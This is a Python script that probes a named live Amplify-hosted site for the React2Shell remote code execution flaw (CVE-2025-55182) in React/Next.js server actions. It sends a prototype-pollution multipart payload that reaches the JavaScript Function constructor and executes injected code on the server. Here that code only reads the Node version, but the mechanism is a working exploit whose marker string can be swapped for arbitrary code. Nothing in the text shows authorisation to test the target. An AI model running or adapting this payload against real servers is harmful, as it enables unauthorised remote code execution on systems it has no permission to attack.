"""Minimal-impact CVE-2025-55182 (React2Shell) verification.

Executes ONLY `process.version` (a property read - no child_process, no shell,
no file/network access) on the target if vulnerable. Proof: a vulnerable
server converts the thrown NEXT_REDIRECT digest into an `x-action-redirect`
response header containing the marker. Patched servers reject the payload.
"""
import http.client
import json
import ssl
import sys

HOST = "main.d4zeeqgazhley.amplifyapp.com"
PATH = "/"

marker_code = (
    "var res='R2S_CONFIRMED_'+process.version;"
    "throw Object.assign(new Error('NEXT_REDIRECT'),"
    "{digest:'NEXT_REDIRECT;push;/r2s?m='+res+';307;'});"
)

field0 = json.dumps({
    "then": "$1:__proto__:then",
    "status": "resolved_model",
    "reason": -1,
    "value": '{"then":"$B1337"}',
    "_response": {
        "_prefix": marker_code,
        "_chunks": "$Q2",
        "_formData": {"get": "$1:constructor:constructor"},
    },
})

boundary = "----R2SBoundary7MA4YWxkTrZu0gW"
parts = [
    (f'Content-Disposition: form-data; name="0"', field0),
    (f'Content-Disposition: form-data; name="1"', '"$@0"'),
    (f'Content-Disposition: form-data; name="2"', "[]"),
]
body = "".join(
    f"--{boundary}\r\n{h}\r\n\r\n{v}\r\n" for h, v in parts
) + f"--{boundary}--\r\n"

conn = http.client.HTTPSConnection(HOST, 443, context=ssl.create_default_context())
conn.request(
    "POST",
    PATH,
    body=body.encode(),
    headers={
        "Host": HOST,
        "Next-Action": "x",
        "Content-Type": f"multipart/form-data; boundary={boundary}",
        "Accept": "text/x-component",
    },
)
resp = conn.getresponse()
payload = resp.read().decode("utf-8", "replace")

print(f"HTTP {resp.status}")
for k, v in resp.getheaders():
    print(f"{k}: {v}")
print("--- body (first 800 bytes) ---")
print(payload[:800])

redirect = dict((k.lower(), v) for k, v in resp.getheaders()).get("x-action-redirect", "")
if "R2S_CONFIRMED_" in redirect or "R2S_CONFIRMED_" in payload:
    print("\n[+] VULNERABLE: server executed marker code and reflected it.")
elif resp.status in (400, 403, 404) and "R2S" not in payload:
    print("\n[-] Payload rejected (likely patched or not reachable).")
else:
    print("\n[?] Inconclusive - inspect output above.")
